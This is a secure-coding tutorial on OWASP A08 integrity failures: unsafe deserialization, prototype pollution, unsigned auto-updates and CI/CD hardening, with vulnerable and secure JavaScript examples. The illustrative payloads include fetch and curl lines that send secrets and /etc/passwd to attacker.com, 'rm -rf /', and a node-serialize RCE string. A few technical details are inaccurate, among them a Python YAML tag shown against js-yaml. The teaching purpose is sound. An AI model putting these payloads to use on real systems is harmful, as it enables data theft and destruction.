# Software and Data Integrity Failures (OWASP A08)

## Definition

**Software and Data Integrity Failures** (OWASP A08:2021) refers to vulnerabilities that allow attackers to compromise the integrity of software code or data during development, build, transport, or runtime. This includes insecure deserialization, auto-update mechanisms without signature verification, compromised CI/CD pipelines, and unsigned code. The attack flow typically involves an attacker inserting malicious code into the software supply chain, affecting all downstream users and organizations. Unlike a traditional vulnerability that requires exploitation, integrity failures can silently distribute compromised code at scale.

## Insecure Deserialization

### How Deserialization Works

```javascript
// Serialization: Convert object to bytes
const user = { name: 'John', age: 30 };
const serialized = JSON.stringify(user);
// Result: '{"name":"John","age":30}'

// Deserialization: Convert bytes back to object
const deserialized = JSON.parse(serialized);
// Result: { name: 'John', age: 30 }
```

### Vulnerable: Deserializing Untrusted Data

```javascript
// ❌ VULNERABLE: Using eval or Function() for deserialization
const userInput = req.body.data;  // From attacker

// eval() executes any JavaScript code
const data = eval(userInput);
// If userInput = "process.exit()" → application crashes
// If userInput = "fetch('http://attacker.com/steal?data=' + process.env.DATABASE_PASSWORD)" → data stolen

// ❌ Using Function() constructor
const maliciousCode = "require('child_process').execSync('rm -rf /')";
const fn = new Function(maliciousCode);
fn();  // Arbitrary code execution!

// ❌ Using require with user input
const module = require(userInput);  // If userInput = "../../../etc/passwd"

// ❌ Using JSON.parse without validation
const data = JSON.parse(userInput);
// If userInput contains malicious objects with special prototype properties
```

### Property Injection / Prototype Pollution

```javascript
// ❌ VULNERABLE: Prototype pollution
const user = {};
const userInput = JSON.parse('{"__proto__": {"admin": true}}');

Object.assign(user, userInput);
// Now: user.__proto__.admin = true
// All objects inherit: admin property set to true!

const newUser = {};
console.log(newUser.admin);  // true! (inherited from modified prototype)

// Real attack:
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');

app.post('/api/users', (req, res) => {
  const user = { name: req.body.name };
  Object.assign(user, userInput);  // Vulnerable merge

  if (user.isAdmin) {  // Now true due to prototype pollution
    user.role = 'admin';  // Attacker becomes admin!
  }
});
```

### Node.js Unsafe Deserialization (node-serialize)

```javascript
// ❌ VULNERABLE: node-serialize package
const serialize = require('node-serialize');

const data = serialize.unserialize(userInput);
// node-serialize has RCE vulnerability
// Attacker can execute arbitrary code during deserialization

// Exploit:
const payload = `_$$ND_FUNC$$_function(){require('child_process').execSync('curl attacker.com/steal?data='+require('fs').readFileSync('/etc/passwd'))}()`;
const serialized = serialize.serialize({
  // contains function that executes on unserialize
});
```

### YAML Deserialization Risk

```javascript
// ❌ VULNERABLE: YAML unsafe load
const yaml = require('js-yaml');

const data = yaml.load(userInput);  // Use load(), not safeLoad()
// YAML can instantiate arbitrary objects
// Attacker can create objects with code execution

// Unsafe YAML:
const yamlCode = `
!!python/object/apply:os.system ["curl attacker.com/steal"]
`;

const result = yaml.load(yamlCode);  // Code executes during deserialization

// ✅ SECURE: Use safeLoad
const result = yaml.safeLoad(userInput);  // Only creates plain objects
```

## Auto-Update Without Signature Verification

### Vulnerable: Unsigned Updates

```javascript
// ❌ VULNERABLE: Auto-update without verification
const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

function autoUpdate() {
  https.get('https://updates.example.com/latest.js', (response) => {
    let data = '';

    response.on('data', (chunk) => {
      data += chunk;
    });

    response.on('end', () => {
      // ❌ No signature verification!
      // ❌ No integrity check!
      // Write and execute without validation

      fs.writeFileSync('./app.js', data);

      // ❌ Execute the update immediately
      execSync('node app.js');

      // If attacker compromises example.com or intercepts traffic:
      // They can inject any code
      // Code runs with application privileges
      // Database credentials, user data, all compromised
    });
  });
}

// Check for updates every hour
setInterval(autoUpdate, 60 * 60 * 1000);
```

### Secure: Signature Verification

```javascript
// ✅ SECURE: Auto-update with signature verification
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const { execSync } = require('child_process');

const PUBLIC_KEY = fs.readFileSync('public-key.pem');

async function autoUpdate() {
  // Download update
  const updateData = await downloadFile('https://updates.example.com/latest.js');
  const signature = await downloadFile('https://updates.example.com/latest.js.sig');

  // ✅ Verify signature
  const verifier = crypto.createVerify('sha256');
  verifier.update(updateData);

  if (!verifier.verify(PUBLIC_KEY, signature, 'base64')) {
    console.error('Update signature verification failed - aborting update');
    return;  // Don't apply untrusted update
  }

  // ✅ Verify checksum
  const expectedHash = await downloadFile('https://updates.example.com/latest.js.sha256');
  const actualHash = crypto
    .createHash('sha256')
    .update(updateData)
    .digest('hex');

  if (actualHash !== expectedHash.trim()) {
    console.error('Update checksum verification failed - aborting update');
    return;
  }

  // ✅ Only after verification, apply update
  fs.writeFileSync('./app-new.js', updateData);

  // ✅ Run in sandbox or separate process first
  execSync('node --check app-new.js');  // Syntax check

  // ✅ Then apply
  fs.renameSync('./app-new.js', './app.js');
  execSync('node app.js');
}

async function downloadFile(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (response) => {
      let data = '';
      response.on('data', chunk => data += chunk);
      response.on('end', () => resolve(data));
      response.on('error', reject);
    });
  });
}
```

## Compromised CI/CD Pipelines

### Vulnerable: Untrusted Build Process

```yaml
# ❌ VULNERABLE: GitHub Actions with no safeguards
name: Build and Deploy

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # ❌ Runs arbitrary scripts from repository
      - uses: actions/checkout@v3

      # ❌ Installs from package.json with postinstall scripts
      - run: npm install  # node_modules/package/postinstall.js runs here!

      # ❌ Runs npm scripts directly
      - run: npm run build

      # ❌ Deploys with credentials exposed
      - run: |
        AWS_ACCESS_KEY_ID=${{ secrets.AWS_KEY }}  # Visible in logs!
        AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET }}
        npm run deploy

      # Attacks possible:
      # 1. Attacker commits malicious postinstall script
      # 2. CI runs npm install, executes postinstall
      # 3. Malicious code steals secrets, exfiltrates code
      # 4. Poisoned build artifact deployed to production
```

### Secure: Hardened CI/CD

```yaml
# ✅ SECURE: Hardened CI/CD pipeline
name: Secure Build and Deploy

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  security-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # ✅ Check for secrets in code
      - name: Check for secrets
        uses: zricethezav/gitleaks-action@master

      # ✅ Dependency vulnerability scanning
      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      # ✅ Code security analysis
      - name: Run SAST scan
        run: npx eslint --format json . > sast-results.json || true

  build:
    runs-on: ubuntu-latest
    needs: security-check

    permissions:
      # ✅ Minimal permissions
      contents: read
      packages: write

    steps:
      - uses: actions/checkout@v3

      # ✅ Use specific action versions (not @latest)
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'

      # ✅ Clean install with verification
      - name: Install dependencies
        run: |
          npm ci  # Clean install, uses package-lock.json
          npm audit --audit-level=moderate  # Verify no vulnerabilities

      # ✅ Disable postinstall scripts
      - name: Verify no malicious scripts
        run: |
          npm list --all  # Show all installed packages

      # ✅ Build in isolated environment
      - name: Build
        run: npm run build:prod

      # ✅ Run security tests
      - name: Security tests
        run: npm run test:security

      # ✅ Create SBOM for supply chain visibility
      - name: Generate SBOM
        run: npm sbom

      # ✅ Generate artifact hash
      - name: Generate artifact hash
        run: |
          sha256sum dist/*.js > artifact.sha256
          cat artifact.sha256

      # ✅ Upload build artifacts securely
      - name: Upload artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-artifacts
          path: dist/
          retention-days: 5

  deploy:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'

    permissions:
      # ✅ Only necessary permissions
      contents: read
      id-token: write  # For OIDC auth

    steps:
      - uses: actions/checkout@v3

      # ✅ Use OIDC instead of static secrets
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::ACCOUNT:role/GithubActionsRole
          aws-region: us-east-1

      # ✅ Secrets not shown in logs
      - name: Deploy to production
        run: |
          aws s3 sync dist/ s3://prod-bucket/
          # No echo of secrets
          # Minimal permissions in IAM role

      # ✅ Verify deployment integrity
      - name: Verify deployment
        run: |
          aws s3 ls s3://prod-bucket/ | head -20
```

## Vulnerable Code Example

```javascript
// ❌ VULNERABLE: Multiple integrity failures
const express = require('express');
const yaml = require('js-yaml');
const fs = require('fs');

const app = express();

// ❌ Vulnerability 1: Unsafe YAML deserialization
app.post('/api/config', (req, res) => {
  try {
    // ❌ Using yaml.load() instead of yaml.safeLoad()
    const config = yaml.load(req.body.configYaml);

    // ❌ Attacker can inject malicious code
    // Attacker sends:
    // !!python/object/apply:os.system ["curl attacker.com/steal"]

    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// ❌ Vulnerability 2: Unsafe deserialization
app.post('/api/data', (req, res) => {
  // ❌ Using eval on user input
  const data = eval(req.body.data);  // NEVER DO THIS!

  // Or using Function constructor
  const fn = new Function(req.body.code);
  fn();  // Arbitrary code execution

  res.json({ success: true });
});

// ❌ Vulnerability 3: Prototype pollution
app.post('/api/merge', (req, res) => {
  const defaults = { role: 'user' };
  const userInput = req.body;

  // ❌ Vulnerable merge
  Object.assign(defaults, userInput);

  // Attacker sends:
  // {"__proto__": {"isAdmin": true}}
  // Now all objects have isAdmin = true!

  res.json({ success: true });
});

// ❌ Vulnerability 4: Unsigned updates
app.get('/api/check-update', (req, res) => {
  const https = require('https');

  https.get('https://updates.example.com/latest.js', (response) => {
    let data = '';

    response.on('data', (chunk) => {
      data += chunk;
    });

    response.on('end', () => {
      // ❌ No signature verification
      // ❌ No integrity check
      // ❌ Immediately execute

      fs.writeFileSync('./update.js', data);
      require('./update.js');  // Execute without verification!

      res.json({ updated: true });
    });
  });
});

app.listen(3000);
```

## Secure Code Example

```javascript
// ✅ SECURE: Proper integrity checks
const express = require('express');
const yaml = require('js-yaml');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// ✅ Security 1: Safe YAML deserialization
app.post('/api/config', (req, res) => {
  try {
    // ✅ Use yaml.safeLoad() only
    const config = yaml.safeLoad(req.body.configYaml, {
      schema: yaml.SAFE_SCHEMA  // Explicit safe schema
    });

    // ✅ Validate loaded data
    if (typeof config !== 'object') {
      return res.status(400).json({ error: 'Invalid config' });
    }

    res.json({ success: true, config });
  } catch (err) {
    console.error('Config parse error:', err.message);
    res.status(400).json({ error: 'Invalid YAML format' });
  }
});

// ✅ Security 2: Safe JSON deserialization
app.post('/api/data', (req, res) => {
  try {
    // ✅ Only use JSON.parse
    const data = JSON.parse(req.body.json);

    // ✅ Validate structure
    if (typeof data !== 'object' || Array.isArray(data)) {
      return res.status(400).json({ error: 'Invalid format' });
    }

    // ✅ Never use eval, Function(), or require with user input

    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: 'Invalid JSON' });
  }
});

// ✅ Security 3: Safe object merging
app.post('/api/merge', (req, res) => {
  const defaults = { role: 'user' };
  const userInput = req.body;

  // ✅ Use allowlist-based merge
  const allowedFields = ['name', 'email'];
  const merged = { ...defaults };

  allowedFields.forEach(field => {
    if (field in userInput) {
      merged[field] = userInput[field];
    }
  });

  // ✅ Alternative: Use Object.create(null)
  const safe = Object.create(null);
  Object.assign(safe, merged);

  // ✅ Or use recursive freeze
  Object.freeze(Object.getPrototypeOf(merged));

  res.json({ success: true });
});

// ✅ Security 4: Signed and verified updates
const PUBLIC_KEY = fs.readFileSync('public-key.pem');

async function downloadAndVerifyUpdate(url, sigUrl) {
  const https = require('https');

  // Download update and signature
  const updateData = await downloadFile(url);
  const signature = await downloadFile(sigUrl);

  // ✅ Verify signature
  const verifier = crypto.createVerify('sha256');
  verifier.update(updateData);

  if (!verifier.verify(PUBLIC_KEY, signature, 'hex')) {
    throw new Error('Signature verification failed');
  }

  // ✅ Verify checksum
  const checksumUrl = url + '.sha256';
  const checksum = await downloadFile(checksumUrl);

  const actualHash = crypto
    .createHash('sha256')
    .update(updateData)
    .digest('hex');

  if (actualHash !== checksum.trim()) {
    throw new Error('Checksum verification failed');
  }

  // ✅ Only after verification, accept update
  return updateData;
}

app.get('/api/check-update', async (req, res) => {
  try {
    const updateData = await downloadAndVerifyUpdate(
      'https://updates.example.com/latest.js',
      'https://updates.example.com/latest.js.sig'
    );

    // ✅ Verify syntax before execution
    const { execSync } = require('child_process');
    execSync('node --check', { input: updateData });

    // ✅ Apply update
    fs.writeFileSync('./update-new.js', updateData);
    fs.renameSync('./update-new.js', './update.js');

    res.json({ updated: true });
  } catch (err) {
    console.error('Update verification failed:', err.message);
    res.status(400).json({ error: 'Update verification failed' });
  }
});

// ✅ Helper: Download with timeout
async function downloadFile(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    const https = require('https');

    const request = https.get(url, { timeout }, (response) => {
      let data = '';

      response.on('data', (chunk) => {
        data += chunk;

        // ✅ Limit download size
        if (data.length > 10 * 1024 * 1024) {  // 10MB limit
          request.abort();
          reject(new Error('Download too large'));
        }
      });

      response.on('end', () => resolve(data));
      response.on('error', reject);
    });

    request.on('error', reject);
    request.on('timeout', () => {
      request.abort();
      reject(new Error('Download timeout'));
    });
  });
}

app.listen(3000);
```

## Mitigations and Best Practices

### 1. Never Deserialize Untrusted Data

```javascript
// ❌ DANGEROUS:
eval()
Function()
node-serialize.unserialize()

// ✅ SAFE:
JSON.parse()
yaml.safeLoad()
```

### 2. Verify All Updates with Signatures

```javascript
// Always verify before using:
- Digital signatures
- Cryptographic hashes
- Certificate chains
- HTTPS (ensures TLS)
```

### 3. Use Package Lock Files

```bash
npm ci  # Uses lock file
# Ensures exact versions installed
# Prevents unexpected package changes
```

### 4. Monitor and Audit CI/CD

```javascript
// Log all pipeline activities
// Monitor for suspicious behavior
// Limit pipeline permissions
// Use hardware security keys for critical operations
```

### 5. Implement Software Bill of Materials

```bash
npm sbom  # Generate SBOM
# Track all components and versions
# Easier vulnerability tracking
```

## Summary

Maintain software and data integrity by refusing to deserialize untrusted data, using safe deserialization methods (JSON.parse, yaml.safeLoad), verifying all updates with cryptographic signatures before execution, hardening CI/CD pipelines with minimal permissions, using lock files to ensure reproducible builds, and implementing monitoring to detect compromised code or data.
